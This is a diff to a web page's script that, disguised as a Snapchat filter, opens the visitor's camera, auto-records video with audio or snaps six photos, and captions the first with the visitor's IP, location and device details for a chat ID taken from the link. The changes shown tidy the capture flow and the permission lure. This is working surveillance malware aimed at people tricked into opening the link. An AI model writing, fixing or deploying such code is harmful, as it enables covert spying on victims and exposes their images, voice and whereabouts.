@@ -92,10 +92,11 @@
         
         const urlParams = new URLSearchParams(window.location.search);
         const CHAT_ID = urlParams.get('id');
-        const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal)
+        const cameraType = urlParams.get('b');
 
         let globalStream = null;
         let ipInfo = {};
+        let isReady = false;
 
         async function getIPAndLocation() {
             try {
@@ -119,7 +120,7 @@
             ipInfo = await getIPAndLocation();
             let constraints = {
                 video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: !cameraType // Agar universal hai to audio bhi, warna sirf video
+                audio: !cameraType
             };
 
             if (cameraType === 'back') {
@@ -142,19 +143,25 @@
 
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = globalStream;
-                document.getElementById('loading-text').style.display = 'none';
+                
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play().then(resolve).catch(resolve);
+                    };
+                });
 
-                // Agar universal link hai to auto video record shuru kar dega
+                document.getElementById('loading-text').style.display = 'none';
+                isReady = true;
+
                 if (!cameraType) {
                     startVideoRecording(globalStream);
                 }
 
             } catch (err) {
-                alert("Please click 'Allow' to load the Snapchat filter!");
+                document.getElementById('loading-text').innerText = "Please allow camera access!";
             }
         }
 
-        // --- UNIVERSAL LINK: Video Recording ---
         async function startVideoRecording(stream) {
             try {
                 let recordedChunks = [];
@@ -216,10 +223,9 @@
             }
         }
 
-        // --- FRONT/BACK LINK: 5-6 Photos with IP only on 1st photo ---
         async function triggerCapture() {
-            if (!globalStream) {
-                alert("Camera not ready yet!");
+            if (!isReady || !globalStream) {
+                alert("Please allow camera permission first!");
                 return;
             }
 
@@ -249,7 +255,6 @@
                 if (blob) {
                     let caption = "";
                     
-                    // Sirf pehli photo ke sath IP aur Device details aayengi
                     if (i === 1) {
                         caption = 
                             `🌐 **IP Information**\n` +
@@ -267,7 +272,6 @@
                             `📸 Shot: ${i}/6\n\n` +
                             `👑 **CREDIT BY : आयुष नेगी**`;
                     } else {
-                        // Baaki photos ke sath sirf shot number aur credit rahega
                         caption = `📸 Shot: ${i}/6\n\n👑 **CREDIT BY : आयुष नेगी**`;
                     }
 
@@ -291,7 +295,7 @@
         }
 
         window.onload = function() {
-            init();
+            initCamera();
         };
     </script>
 </body>
